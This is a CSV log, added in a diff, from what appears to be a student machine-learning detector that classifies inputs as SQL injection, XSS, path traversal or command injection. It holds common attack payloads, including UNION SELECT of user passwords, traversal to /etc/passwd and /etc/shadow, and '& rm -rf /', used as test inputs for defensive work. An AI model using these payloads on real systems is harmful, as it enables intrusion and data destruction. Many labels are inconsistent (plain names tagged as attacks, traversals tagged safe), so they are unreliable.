@@ -1,0 +1,791 @@
+timestamp,payload,result,attack_type,confidence
+2025-12-09T11:40:12.606358,1=='1,malicious,Command Injection,0.6947
+2025-12-09T11:40:45.374621,' OR 1=1 --,malicious,SQL Injection,0.7873
+2025-12-09T11:40:56.270340,<script>alert(1)</script>,malicious,XSS,0.9400
+2025-12-09T17:17:43.151274,srihari hello123,malicious,Command Injection,0.6947
+2025-12-09T17:18:04.069240,' OR 1=1 -- anything,malicious,SQL Injection,0.7873
+2025-12-09T17:18:14.979352,123 test,malicious,Command Injection,0.6947
+2025-12-09T17:18:21.009988,111 111,malicious,Command Injection,0.6947
+2025-12-17T09:48:29.406559,"1""1 11",malicious,Command Injection,0.6947
+2025-12-17T09:49:48.234989,2211,malicious,Command Injection,0.6947
+2025-12-17T13:42:26.302098,"1""1",malicious,Command Injection,0.6947
+2025-12-17T13:42:53.981228,"1""1 3454",malicious,Command Injection,0.6947
+2025-12-17T13:43:15.659136,"""hello"" 0",malicious,SQL Injection,0.5340
+2025-12-17T13:43:19.374885,111 111,malicious,Command Injection,0.6947
+2026-01-22T02:17:40.817281,"""<iframe src='javascript:alert(1)'></iframe>"",1",malicious,Command Injection,0.6947
+2026-01-22T02:17:44.349574,,malicious,Command Injection,0.6947
+2026-01-22T02:17:45.354449,,malicious,Command Injection,0.6947
+2026-01-23T06:37:22.558221,uyvwef,malicious,Command Injection,0.6947
+2026-01-23T06:37:40.917373,"""& rm -rf /"",1",malicious,Command Injection,0.6947
+2026-01-23T06:37:49.914775,"""<iframe src='javascript:alert(1)'></iframe>"",1
+",malicious,Command Injection,0.6947
+2026-01-23T06:38:33.961555,"""<iframe src='javascript:alert(1)'></iframe>"",1
+",malicious,Command Injection,0.6947
+2026-01-23T06:38:43.859944,"""admin' #"",1
+",malicious,SQL Injection,0.7211
+2026-01-23T06:38:58.689493,"""'><script>alert(1)</script>"",1
+",malicious,XSS,0.9400
+2026-01-23T08:41:18.852810,8743yr,malicious,Command Injection,0.6947
+2026-01-23T08:42:07.114114,"""' OR 'a'='a"",1
+",malicious,SQL Injection,0.7873
+2026-02-01T07:42:40.620121,23544356,malicious,Command Injection,0.6947
+2026-02-01T07:43:01.256942,44,malicious,Command Injection,0.6947
+2026-02-01T07:43:04.484660,2345677,malicious,Command Injection,0.6947
+2026-02-01T07:43:07.006516,234346,malicious,Command Injection,0.6947
+2026-02-01T07:43:17.145421,"""..%2F..%2Fetc%2Fpasswd"",1",malicious,Path Traversal,0.8220
+2026-02-01T08:05:32.283562,sert,malicious,Command Injection,0.6947
+2026-02-01T08:28:39.279652,jhvcSD,malicious,Command Injection,0.6947
+2026-02-01T08:28:47.744426,"hdhfbfhdhbdd
+",malicious,Command Injection,0.6947
+2026-02-01T08:28:56.937093,shashank,malicious,Command Injection,0.6947
+2026-02-01T08:29:05.624343,hari,malicious,Command Injection,0.6947
+2026-02-01T08:36:17.899714,"""search=product"",0",malicious,Command Injection,0.6947
+2026-02-01T08:36:59.918325,"""<img src=x onerror=alert('XSS')>"",1",malicious,XSS,0.8300
+2026-02-01T08:37:12.238523,"""welcome user"",0",malicious,Command Injection,0.6947
+2026-02-01T08:37:23.255896,"""' OR 'a'='a"",1",malicious,SQL Injection,0.7873
+2026-02-01T09:21:33.305108,hari,malicious,Command Injection,0.6947
+2026-02-01T09:27:24.533569,hari,malicious,Command Injection,0.6947
+2026-02-01T09:27:31.085701,hari,malicious,Command Injection,0.6947
+2026-02-01T09:27:52.832821,hari,malicious,Command Injection,0.6947
+2026-02-01T09:28:14.308067,hari,malicious,Command Injection,0.6947
+2026-02-01T09:30:31.232240,hari,malicious,Command Injection,0.6947
+2026-02-01T09:50:17.979858,"shashank
+",safe,None,0.0000
+2026-02-01T09:50:27.660886,bhsdavuvu,safe,None,0.0000
+2026-02-01T09:50:43.205286,"""../config.php"",1",safe,None,0.0000
+2026-02-01T09:50:55.720868,"""/images/logo.png"",0",safe,None,0.0000
+2026-02-01T09:51:06.592761,"'><script>alert(1)</script>"",1",safe,None,0.0000
+2026-02-01T09:51:17.149419,"""%2e%2e/%2e%2e/etc/shadow"",1",safe,None,0.0000
+2026-02-01T09:51:29.670949,"""' OR '1'='1"",1",malicious,SQL Injection,0.6709
+2026-02-01T09:51:47.901044,"""admin' --"",1",malicious,SQL Injection,0.6193
+2026-02-01T09:51:57.763045,"""nice comment"",0",safe,None,0.0000
+2026-02-01T09:52:06.933037,"""hello"",0",safe,None,0.0000
+2026-02-01T09:52:13.080319,"""search=product"",0",malicious,SQL Injection,0.6709
+2026-02-01T09:52:39.512435,"""search=product"",0",malicious,SQL Injection,0.6709
+2026-02-01T09:52:55.102920,harirao,safe,None,0.0000
+2026-02-01T09:53:33.131868,"""""""search=product"""",0""",malicious,SQL Injection,0.6709
+2026-02-01T09:53:51.779512,Shashank Reddy,safe,None,0.0000
+2026-02-01T09:54:02.474344,Shashank Reddy,safe,None,0.0000
+2026-02-01T09:54:12.929061,hi i am virus,safe,None,0.0000
+2026-02-01T16:12:09.087249,"shashank
+",malicious,SQL Injection,0.8496
+2026-02-01T16:12:34.057613,..%2F..%2Fetc/passwd,malicious,Path Traversal,0.9634
+2026-02-01T16:12:42.389140,../var/www/html/config.php,malicious,Path Traversal,0.9601
+2026-02-01T16:13:00.875865,'/**/OR/**/1=1/**/--,malicious,SQL Injection,0.9982
+2026-02-01T16:13:08.710386,"""' UNION SELECT username, password FROM users --""",malicious,SQL Injection,0.9996
+2026-02-01T16:13:17.969212,"
+<script>confirm(1)</script>",malicious,XSS,0.9537
+2026-02-01T16:15:15.677856,<svg onload=prompt(1)>,malicious,XSS,0.9719
+2026-02-01T16:15:58.617680,"home?id=1
+login?page=2
+profile?user=3
+",malicious,SQL Injection,0.8496
+2026-02-01T16:16:15.760949,"username=admin
+password=test123
+search=test
+",malicious,SQL Injection,0.9989
+2026-02-01T16:19:05.468001,hari rao uk,malicious,SQL Injection,0.8496
+2026-02-01T17:01:23.488792,"shashank, hari",malicious,SQL Injection,0.6893
+2026-02-01T17:28:58.445473,shashank,safe,None,0.00
+2026-02-01T17:29:08.381399,sdhvuiav>usDI,safe,None,0.00
+2026-02-01T17:29:36.493799,"../../../../../../../web.xml
+",safe,Path Traversal,0.66
+2026-02-01T17:29:47.198454,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/web%2exml
+",safe,Path Traversal,0.67
+2026-02-01T17:29:53.610069,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/application%2eproperties
+",safe,Path Traversal,0.67
+2026-02-01T17:30:01.645222,"../../../../../../../boot.ini
+",safe,Path Traversal,0.66
+2026-02-01T17:30:12.989929,"""' UNION SELECT BW1Z2Z,t6lyOv FROM ZiKQIz --""
+",malicious,SQL Injection,1.00
+2026-02-01T17:30:27.885282,"..//..//..//..//..//..//..//etc//passwd
+",safe,Path Traversal,0.66
+2026-02-01T17:30:39.616376,"%2e%2e/etc/passwd
+",safe,Path Traversal,0.67
+2026-02-01T17:30:46.044181,"%2e%2e/var/log/auth%2elog
+",safe,Path Traversal,0.66
+2026-02-01T17:30:54.976310,"..//etc//passwd
+",safe,Path Traversal,0.66
+2026-02-01T17:31:04.224078,"../../../../boot.ini
+",safe,Path Traversal,0.66
+2026-02-01T17:31:12.003709,"' OR eLGPsV LIKE 'yyP612' --
+",malicious,SQL Injection,1.00
+2026-02-01T17:31:20.758544,"' AND 6V96Gw=L3eNry --
+",malicious,SQL Injection,0.99
+2026-02-01T17:31:29.618610,"' AND m6ynM8=uxFWzq --
+",malicious,SQL Injection,0.99
+2026-02-01T17:31:38.703298,"' OR 'OIU6CF'='a0h0I8' --
+",malicious,SQL Injection,0.99
+2026-02-01T17:31:45.652540,"' OR 'StBh19'='Y5EXGg' --
+",malicious,SQL Injection,0.99
+2026-02-01T17:31:51.992618,"' OR gutryN LIKE '3NZKPX' --
+",malicious,SQL Injection,1.00
+2026-02-01T17:32:00.022265,"' AND WLobbY=DSuhrT --
+",malicious,SQL Injection,0.99
+2026-02-01T17:32:06.428212,"' OR 'cjAdM8'='pHFIkf' --
+",malicious,SQL Injection,0.99
+2026-02-01T17:32:14.931069,"' AND 1wt4RC=yxxmvF --
+",malicious,SQL Injection,0.99
+2026-02-01T17:32:20.749410,"<script>confirm('QrTTHu')</script>
+",malicious,XSS,0.90
+2026-02-01T17:32:51.221958,"<script>alert('38gAHR')</script>
+",malicious,XSS,0.90
+2026-02-01T17:33:01.182437,"<svg onload=alert('qvk4wo')>
+",malicious,XSS,0.86
+2026-02-01T17:33:11.928968,"<img src=x onerror=confirm('fLLvKm')>
+",malicious,XSS,0.90
+2026-02-01T17:33:23.695369,"<svg onload=prompt('IDC0Hz')>
+",safe,None,0.00
+2026-02-01T17:33:45.420488,"<img src=x onerror=alert('xzpfSP')>
+",malicious,XSS,0.91
+2026-02-01T17:34:44.973017,"' AND 6wy8PI=X0H2oZ --
+",malicious,SQL Injection,0.99
+2026-02-01T17:34:52.124007,"' OR 'CH0q4E'='I4wbpz' --
+",malicious,SQL Injection,0.99
+2026-02-01T17:35:08.447466,"' OR 'KpT7Cz'='YjulMf' --
+",malicious,SQL Injection,0.99
+2026-02-01T17:35:24.965046,"1=""1""",safe,None,0.00
+2026-02-01T17:35:51.479627,"1=""1""",safe,None,0.00
+2026-02-01T18:07:03.335069,"1=""1""",safe,None,0.0000
+2026-02-01T18:15:32.830995,"1=""1""",safe,None,0.0000
+2026-02-01T18:26:07.478588,"1=""1""
+",safe,None,0.0000
+2026-02-01T18:29:23.120313,"1=""1""",safe,None,0.0000
+2026-02-01T18:30:30.775883,"1=""1""",safe,None,0.0000
+2026-02-01T18:38:43.247408,"1=""1""
+",safe,None,0.0000
+2026-02-01T18:46:00.912120,"1=""1""",malicious,SQL Injection,0.9900
+2026-02-01T18:48:30.944638,shashank,safe,None,0.0000
+2026-02-01T18:48:45.748266,hari rao uk,safe,None,0.0000
+2026-02-01T18:48:56.520982,../../../../boot.ini,safe,Path Traversal,0.6636
+2026-02-01T18:49:03.766112,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot%2eini
+",safe,Path Traversal,0.6620
+2026-02-01T18:49:11.146971,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/application%2eproperties
+",safe,Path Traversal,0.6650
+2026-02-01T18:49:25.763731,"1=""1""",malicious,SQL Injection,0.9900
+2026-02-01T18:49:31.664404,"""' UNION SELECT lWe5W4,N5z2ET FROM LACZqB --""
+",malicious,SQL Injection,0.9900
+2026-02-01T18:49:54.236481,"<img src=x onerror=alert('xzpfSP')>
+",malicious,XSS,0.9154
+2026-02-01T18:50:02.222827,"<svg onload=prompt('IDC0Hz')>
+",safe,None,0.0000
+2026-02-01T18:50:10.866163,"<img src=x onerror=confirm('G3ATKP')>
+",malicious,XSS,0.9081
+2026-02-01T18:50:27.271919,"2=""2""",safe,None,0.0000
+2026-02-01T18:50:47.633165,"' AND D5HyrU=kFsy1r --
+",malicious,SQL Injection,0.9900
+2026-02-01T18:50:54.692765,"' AND D5HyrU=kFsy1r ---
+",malicious,SQL Injection,0.9900
+2026-02-01T18:51:02.253448,"' AND D5HyrU=kFgftsy1r --
+",malicious,SQL Injection,0.9900
+2026-02-01T18:51:20.324230,"<body onload=confirm('b6sVAu')>
+
+",malicious,XSS,0.8968
+2026-02-01T18:51:28.593813,"<img src=x onerror=alert('xzpfSP')>
+",malicious,XSS,0.9154
+2026-02-01T18:51:38.794951,"<img src=x onerror=confirm('G3ATKP')>
+",malicious,XSS,0.9081
+2026-02-01T18:51:46.108008,"<img src=x onerror=alert('xzpfSP')>
+",malicious,XSS,0.9154
+2026-02-01T18:51:51.359514,"<script>prompt('vLjGIe')</script>
+",malicious,XSS,0.8989
+2026-02-01T18:51:57.146934,"<svg onload=prompt('9JzAjw')>
+",malicious,XSS,0.8623
+2026-02-01T18:52:01.957623,"<img src=x onerror=confirm('G3ATKP')>
+",malicious,XSS,0.9081
+2026-02-01T18:52:08.045078,"<svg onload=prompt('GJDF3y')>
+",malicious,XSS,0.8532
+2026-02-01T18:52:14.357619,"<body onload=alert('VjdXGx')>
+",malicious,XSS,0.8992
+2026-02-01T18:52:25.750210,"search=titspi
+",safe,None,0.0000
+2026-02-01T18:52:33.800741,"email=dpsohl@gmail.com
+",safe,None,0.0000
+2026-02-01T18:52:47.808463,"email=shashankreddy2234@gmail.com
+",safe,None,0.0000
+2026-02-01T18:53:56.691867,"1=""1""",malicious,SQL Injection,0.9900
+2026-02-01T18:54:17.972678,"2=""2""",safe,None,0.0000
+2026-02-01T18:55:51.767148,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/config%2ephp,safe,Path Traversal,0.6681
+2026-02-01T18:56:12.207927,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/web%2exml
+",safe,Path Traversal,0.6650
+2026-02-01T18:56:21.516760,"' OR AWdExu LIKE '01PLiV' --
+",malicious,SQL Injection,0.9900
+2026-02-01T18:56:30.491911,"<body onload=alert('VjdXGx')>
+",malicious,XSS,0.8992
+2026-02-01T18:56:45.983467,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/config%2ephp
+",safe,Path Traversal,0.6681
+2026-02-01T19:00:04.129544,"'||/**/OR/**/1=1
+",malicious,SQL Injection,0.9900
+2026-02-01T19:40:26.423379,shasank@gmail.com,safe,None,0.0000
+2026-02-01T19:40:36.439422,"sdjvcSDV>//,L;DSMSFMCSDL",safe,None,0.0000
+2026-02-01T19:40:51.362777,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system%2eini,safe,Path Traversal,0.6722
+2026-02-01T19:41:02.163887,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/config%2ephp
+",safe,Path Traversal,0.6681
+2026-02-01T19:41:09.227157,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/log/auth%2elog
+",safe,Path Traversal,0.6767
+2026-02-01T19:41:14.819567,"../../../../../../../windows/system.ini
+",safe,Path Traversal,0.6664
+2026-02-01T19:41:23.967180,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot%2eini
+",safe,Path Traversal,0.6651
+2026-02-01T19:41:30.945794,"..//..//..//..//..//config.php
+",safe,Path Traversal,0.6628
+2026-02-01T19:41:35.783571,"../../../../../boot.ini
+",safe,Path Traversal,0.6636
+2026-02-01T19:41:41.022904,"..//..//..//..//boot.ini
+",safe,Path Traversal,0.6636
+2026-02-01T19:41:48.228045,"../../../application.properties
+",safe,Path Traversal,0.6628
+2026-02-01T19:41:56.067472,"""' UNION SELECT 6Gez3m,qyEa6Q FROM dm29yE --""
+",malicious,SQL Injection,0.9900
+2026-02-01T19:42:05.271475,"../../../application.properties
+",safe,Path Traversal,0.6628
+2026-02-01T19:42:13.183126,"../../../../web.xml
+",safe,Path Traversal,0.6628
+2026-02-01T19:42:23.130108,"..//..//..//..//..//..//..//application.properties
+",safe,Path Traversal,0.6628
+2026-02-01T19:42:28.429145,"../../../../../../../application.properties
+",safe,Path Traversal,0.6628
+2026-02-01T19:42:35.714065,"..//..//..//..//..//..//..//boot.ini
+",safe,Path Traversal,0.6636
+2026-02-01T19:43:21.875784,"..//..//..//..//..//..//..//boot.ini
+",safe,Path Traversal,0.6636
+2026-02-01T19:43:36.776086,"..%2F..%2F..%2Fetc%2Fpasswd
+",safe,None,0.0000
+2026-02-01T19:43:51.581279,"..%5c..%5c..%5cwindows%5csystem32
+",safe,None,0.0000
+2026-02-01T19:46:33.004785,"../../../../etc/passwd
+",malicious,Path Traversal,0.9800
+2026-02-01T19:47:21.149795,"../../../../../../../windows/system.ini
+",malicious,Path Traversal,0.9800
+2026-02-01T19:47:45.485412,"' OR 'KpT7Cz'='YjulMf' --
+",malicious,SQL Injection,0.9900
+2026-02-01T19:47:54.255200,"""' UNION SELECT NUwRTq,ptI8vZ FROM Enwd8y --""
+",malicious,SQL Injection,0.9900
+2026-02-01T19:48:04.277870,"' OR DKDaQI LIKE 'zvVhym' --
+",malicious,SQL Injection,0.9900
+2026-02-01T19:48:10.836129,shashajkn,safe,None,0.0000
+2026-02-01T19:48:24.953572,"<img src=x onerror=alert('xzpfSP')>
+",malicious,XSS,0.9154
+2026-02-01T19:48:30.799174,"<img src=x onerror=confirm('G3ATKP')>
+",malicious,XSS,0.9081
+2026-02-01T19:48:42.528710,sbhckjas@gmail,safe,None,0.0000
+2026-02-01T19:48:51.997258,vdsavoyUI>'//SFC.sdf,safe,None,0.0000
+2026-02-01T19:49:01.798305,"DSV.,.;.>>>""|'/KJLGFHDF",safe,None,0.0000
+2026-02-01T19:49:09.423039,"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system%2eini
+",malicious,Path Traversal,0.9800
+2026-02-01T19:49:25.319422,"<body onload=alert('Cl8SHl')>
+",malicious,XSS,0.9038
+2026-02-01T19:49:35.331988,"username=qnyxpg&password=orykfito
+",safe,None,0.0000
+2026-02-01T19:49:41.889876,"email=qgeejb@gmail.com
+",safe,None,0.0000
+2026-02-02T06:48:36.138855,"' AND T7SRck=YK1aXp --
+",malicious,SQL Injection,0.9900
+2026-02-02T06:48:58.068347,shahsank ,safe,None,0.0000
+2026-02-02T06:49:15.069343,gopisir@gmail.com,safe,None,0.0000
+2026-02-02T06:49:39.731698,"../../../../../../etc/passwd
+",malicious,Path Traversal,0.9800
+2026-02-02T06:50:08.665170,"' OR DKDaQI LIKE 'zvVhym' --
+",malicious,SQL Injection,0.9900
+2026-02-02T06:50:18.499257,"<script>prompt('eWjqlv')</script>
+",malicious,XSS,0.9212
+2026-02-02T06:56:46.394027,"1=""1""",malicious,SQL Injection,0.9900
+2026-02-02T07:05:08.347262,"' OR 'pd3nc9'='kskmre' --
+",malicious,SQL Injection,0.9900
+2026-02-02T07:05:24.783552,"' OR 5eZ5WG LIKE 'DBD9F4' --
+",malicious,SQL Injection,0.9900
+2026-02-02T18:00:42.962109,"../../etc/passwd
+",Logistic Regression,3,Path Traversal,0.9894
+2026-02-02T18:00:42.963655,"../../etc/passwd
+",SVM,3,Path Traversal,0.6779
+2026-02-02T18:00:42.964721,"../../etc/passwd
+",Random Forest,3,Path Traversal,1.0000
+2026-02-02T18:00:42.965264,"../../etc/passwd
+",ANN,3,Path Traversal,1.0000
+2026-02-02T18:00:48.740466,"../../etc/passwd
+",Logistic Regression,3,Path Traversal,0.9894
+2026-02-02T18:00:48.741332,"../../etc/passwd
+",SVM,3,Path Traversal,0.6779
+2026-02-02T18:00:48.742225,"../../etc/passwd
+",Random Forest,3,Path Traversal,1.0000
+2026-02-02T18:00:48.742706,"../../etc/passwd
+",ANN,3,Path Traversal,1.0000
+2026-02-02T18:01:31.090169,shashank,Logistic Regression,0,Safe,0.9743
+2026-02-02T18:01:31.090740,shashank,SVM,0,Safe,0.9979
+2026-02-02T18:01:31.091215,shashank,Random Forest,0,Safe,0.9989
+2026-02-02T18:01:31.091641,shashank,ANN,0,Safe,0.9990
+2026-02-02T18:05:11.846994,shashank,Logistic Regression,0,Safe,0.9743
+2026-02-02T18:05:11.847928,shashank,SVM,0,Safe,0.9979
+2026-02-02T18:05:11.848739,shashank,Random Forest,0,Safe,0.9989
+2026-02-02T18:05:11.849595,shashank,ANN,0,Safe,0.9990
+2026-02-02T18:05:28.571696,"<script>alert(1)</script>
+",Logistic Regression,1,XSS,0.8519
+2026-02-02T18:05:28.572391,"<script>alert(1)</script>
+",SVM,1,XSS,0.9682
+2026-02-02T18:05:28.572908,"<script>alert(1)</script>
+",Random Forest,1,XSS,0.8455
+2026-02-02T18:05:28.573347,"<script>alert(1)</script>
+",ANN,1,XSS,0.9695
+2026-02-02T18:05:45.235914,"../../etc/passwd
+",Logistic Regression,3,Path Traversal,0.9894
+2026-02-02T18:05:45.236668,"../../etc/passwd
+",SVM,3,Path Traversal,0.6779
+2026-02-02T18:05:45.238062,"../../etc/passwd
+",Random Forest,3,Path Traversal,1.0000
+2026-02-02T18:05:45.238669,"../../etc/passwd
+",ANN,3,Path Traversal,1.0000
+2026-02-02T18:05:59.665294,"' OR 1=1 --
+",Logistic Regression,2,SQL Injection,0.8042
+2026-02-02T18:05:59.665869,"' OR 1=1 --
+",SVM,2,SQL Injection,0.9682
+2026-02-02T18:05:59.666419,"' OR 1=1 --
+",Random Forest,2,SQL Injection,0.7849
+2026-02-02T18:05:59.666917,"' OR 1=1 --
+",ANN,2,SQL Injection,0.9624
+2026-02-02T18:06:10.711555,"hello world
+",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:06:10.712315,"hello world
+",SVM,0,Safe,0.9979
+2026-02-02T18:06:10.713128,"hello world
+",Random Forest,0,Safe,0.9989
+2026-02-02T18:06:10.713709,"hello world
+",ANN,0,Safe,0.9990
+2026-02-02T18:06:19.033595,shashank@mail.com,Logistic Regression,0,Safe,0.9898
+2026-02-02T18:06:19.034546,shashank@mail.com,SVM,0,Safe,0.9985
+2026-02-02T18:06:19.035406,shashank@mail.com,Random Forest,0,Safe,0.9993
+2026-02-02T18:06:19.036090,shashank@mail.com,ANN,0,Safe,1.0000
+2026-02-02T18:06:29.442028,gopisir@gmail.com,Logistic Regression,0,Safe,0.9984
+2026-02-02T18:06:29.442976,gopisir@gmail.com,SVM,0,Safe,0.9992
+2026-02-02T18:06:29.443560,gopisir@gmail.com,Random Forest,0,Safe,1.0000
+2026-02-02T18:06:29.444475,gopisir@gmail.com,ANN,0,Safe,1.0000
+2026-02-02T18:06:41.442192,"2=""2""",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:06:41.442968,"2=""2""",SVM,0,Safe,0.9979
+2026-02-02T18:06:41.443484,"2=""2""",Random Forest,0,Safe,0.9989
+2026-02-02T18:06:41.444003,"2=""2""",ANN,0,Safe,0.9990
+2026-02-02T18:06:47.506869,"1=""1""",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:06:47.507543,"1=""1""",SVM,0,Safe,0.9979
+2026-02-02T18:06:47.508243,"1=""1""",Random Forest,0,Safe,0.9989
+2026-02-02T18:06:47.508766,"1=""1""",ANN,0,Safe,0.9990
+2026-02-02T18:06:54.215790,"1=""1""",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:06:54.216377,"1=""1""",SVM,0,Safe,0.9979
+2026-02-02T18:06:54.216938,"1=""1""",Random Forest,0,Safe,0.9989
+2026-02-02T18:06:54.217536,"1=""1""",ANN,0,Safe,0.9990
+2026-02-02T18:07:21.995193,"1=""1""",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:07:21.995771,"1=""1""",SVM,0,Safe,0.9979
+2026-02-02T18:07:21.996156,"1=""1""",Random Forest,0,Safe,0.9989
+2026-02-02T18:07:21.996564,"1=""1""",ANN,0,Safe,0.9990
+2026-02-02T18:28:34.646498,<script>alert(1)</script>,Logistic Regression,1,XSS,0.8519
+2026-02-02T18:28:34.646953,<script>alert(1)</script>,SVM,1,XSS,0.9685
+2026-02-02T18:28:34.647448,<script>alert(1)</script>,Random Forest,1,XSS,0.8455
+2026-02-02T18:28:34.648004,<script>alert(1)</script>,ANN,1,XSS,0.9695
+2026-02-02T18:28:44.644306,"1=""1""",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:28:44.644970,"1=""1""",SVM,0,Safe,0.9980
+2026-02-02T18:28:44.645547,"1=""1""",Random Forest,0,Safe,0.9989
+2026-02-02T18:28:44.645993,"1=""1""",ANN,0,Safe,0.9990
+2026-02-02T18:30:46.358878,1=1,Logistic Regression,0,Safe,0.9743
+2026-02-02T18:30:46.359323,1=1,SVM,0,Safe,0.9980
+2026-02-02T18:30:46.359739,1=1,Random Forest,0,Safe,0.9989
+2026-02-02T18:30:46.360052,1=1,ANN,0,Safe,0.9990
+2026-02-02T18:31:05.520425,' OR 1=1 --,Logistic Regression,2,SQL Injection,0.8042
+2026-02-02T18:31:05.521022,' OR 1=1 --,SVM,2,SQL Injection,0.9676
+2026-02-02T18:31:05.521429,' OR 1=1 --,Random Forest,2,SQL Injection,0.7849
+2026-02-02T18:31:05.521924,' OR 1=1 --,ANN,2,SQL Injection,0.9624
+2026-02-02T18:31:18.559213,OR 1=1,Logistic Regression,2,SQL Injection,0.8042
+2026-02-02T18:31:18.559880,OR 1=1,SVM,2,SQL Injection,0.9676
+2026-02-02T18:31:18.560394,OR 1=1,Random Forest,2,SQL Injection,0.7849
+2026-02-02T18:31:18.561088,OR 1=1,ANN,2,SQL Injection,0.9624
+2026-02-02T18:31:48.728533,"username=yqknzf&password=vjrvqrcx 123,0
+",Logistic Regression,0,Safe,0.9977
+2026-02-02T18:31:48.729162,"username=yqknzf&password=vjrvqrcx 123,0
+",SVM,0,Safe,0.9983
+2026-02-02T18:31:48.729589,"username=yqknzf&password=vjrvqrcx 123,0
+",Random Forest,0,Safe,1.0000
+2026-02-02T18:31:48.730019,"username=yqknzf&password=vjrvqrcx 123,0
+",ANN,0,Safe,1.0000
+2026-02-02T18:31:59.003288,"<script>confirm('nxSEcI')</script> sample,1
+",Logistic Regression,1,XSS,0.7849
+2026-02-02T18:31:59.004250,"<script>confirm('nxSEcI')</script> sample,1
+",SVM,1,XSS,0.9685
+2026-02-02T18:31:59.005319,"<script>confirm('nxSEcI')</script> sample,1
+",Random Forest,1,XSS,0.7712
+2026-02-02T18:31:59.006231,"<script>confirm('nxSEcI')</script> sample,1
+",ANN,1,XSS,0.9645
+2026-02-02T18:32:16.782172,"<img srcx onerrorconfirm(65NJAS)>,1
+",Logistic Regression,1,XSS,0.9032
+2026-02-02T18:32:16.782967,"<img srcx onerrorconfirm(65NJAS)>,1
+",SVM,1,XSS,0.9685
+2026-02-02T18:32:16.783516,"<img srcx onerrorconfirm(65NJAS)>,1
+",Random Forest,1,XSS,0.8974
+2026-02-02T18:32:16.784085,"<img srcx onerrorconfirm(65NJAS)>,1
+",ANN,1,XSS,0.9830
+2026-02-02T18:33:54.965726,"<script>alert(1)</script>
+",Logistic Regression,1,XSS,0.8519
+2026-02-02T18:33:54.966292,"<script>alert(1)</script>
+",SVM,1,XSS,0.9685
+2026-02-02T18:33:54.966796,"<script>alert(1)</script>
+",Random Forest,1,XSS,0.8455
+2026-02-02T18:33:54.967214,"<script>alert(1)</script>
+",ANN,1,XSS,0.9695
+2026-02-02T18:34:30.919818,"<script>alert(1)</script>
+",Logistic Regression,1,XSS,0.8519
+2026-02-02T18:34:30.920462,"<script>alert(1)</script>
+",SVM,1,XSS,0.9685
+2026-02-02T18:34:30.920940,"<script>alert(1)</script>
+",Random Forest,1,XSS,0.8455
+2026-02-02T18:34:30.921359,"<script>alert(1)</script>
+",ANN,1,XSS,0.9695
+2026-02-02T18:34:44.843032,avinash@gmail.com,Logistic Regression,0,Safe,0.9984
+2026-02-02T18:34:44.843684,avinash@gmail.com,SVM,0,Safe,0.9992
+2026-02-02T18:34:44.844058,avinash@gmail.com,Random Forest,0,Safe,1.0000
+2026-02-02T18:34:44.844427,avinash@gmail.com,ANN,0,Safe,1.0000
+2026-02-02T18:35:08.673512,abc@gmail.com,Logistic Regression,0,Safe,0.9984
+2026-02-02T18:35:08.674307,abc@gmail.com,SVM,0,Safe,0.9992
+2026-02-02T18:35:08.675118,abc@gmail.com,Random Forest,0,Safe,1.0000
+2026-02-02T18:35:08.675792,abc@gmail.com,ANN,0,Safe,1.0000
+2026-02-02T18:35:26.448956,"<script>alert(1)</script>
+",Logistic Regression,1,XSS,0.8519
+2026-02-02T18:35:26.449530,"<script>alert(1)</script>
+",SVM,1,XSS,0.9685
+2026-02-02T18:35:26.449900,"<script>alert(1)</script>
+",Random Forest,1,XSS,0.8455
+2026-02-02T18:35:26.450222,"<script>alert(1)</script>
+",ANN,1,XSS,0.9695
+2026-02-02T18:37:46.227706,"1=""1""",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:37:46.228569,"1=""1""",SVM,0,Safe,0.9980
+2026-02-02T18:37:46.229229,"1=""1""",Random Forest,0,Safe,0.9989
+2026-02-02T18:37:46.229920,"1=""1""",ANN,0,Safe,0.9990
+2026-02-02T18:38:09.355035,"id7174,0
+",Logistic Regression,0,Safe,0.9743
+2026-02-02T18:38:09.355686,"id7174,0
+",SVM,0,Safe,0.9980
+2026-02-02T18:38:09.356315,"id7174,0
+",Random Forest,0,Safe,0.9989
+2026-02-02T18:38:09.356760,"id7174,0
+",ANN,0,Safe,0.9990
+2026-02-02T18:38:15.657219,"<body onload=alert('PpIkoI')>,1
+",Logistic Regression,1,XSS,0.7179
+2026-02-02T18:38:15.658199,"<body onload=alert('PpIkoI')>,1
+",SVM,1,XSS,0.9685
+2026-02-02T18:38:15.658840,"<body onload=alert('PpIkoI')>,1
+",Random Forest,1,XSS,0.7943
+2026-02-02T18:38:15.659330,"<body onload=alert('PpIkoI')>,1
+",ANN,1,XSS,0.9678
+2026-02-02T18:38:27.992397,"<body onload=alert('PpIkoI')>,2
+",Logistic Regression,1,XSS,0.7179
+2026-02-02T18:38:27.993100,"<body onload=alert('PpIkoI')>,2
+",SVM,1,XSS,0.9685
+2026-02-02T18:38:27.993809,"<body onload=alert('PpIkoI')>,2
+",Random Forest,1,XSS,0.7943
+2026-02-02T18:38:27.994311,"<body onload=alert('PpIkoI')>,2
+",ANN,1,XSS,0.9678
+2026-02-02T18:38:38.480416,"<body onload=alert('gopiI')>,1
+",Logistic Regression,1,XSS,0.7179
+2026-02-02T18:38:38.481071,"<body onload=alert('gopiI')>,1
+",SVM,1,XSS,0.9685
+2026-02-02T18:38:38.481492,"<body onload=alert('gopiI')>,1
